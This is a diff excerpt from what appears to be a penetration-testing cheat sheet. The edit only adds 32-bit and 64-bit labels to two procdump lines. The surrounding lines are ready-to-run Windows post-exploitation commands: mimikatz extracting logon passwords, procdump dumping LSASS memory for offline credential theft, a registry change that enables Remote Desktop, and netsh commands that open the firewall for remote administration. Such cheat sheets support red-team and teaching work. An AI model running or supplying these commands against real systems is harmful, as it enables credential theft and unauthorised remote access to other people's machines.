@@ -143,8 +143,8 @@ See netcat cheat sheet
 `mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”`  
 `Procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
 `mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”`  
-`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
-`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`  
+(32-bit) `C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
+(64-bit) `C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`  
 `reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0`  
 `netsh firewall set service remoteadmin enable`  
 `netsh firewall set service remotedesktop enable`  
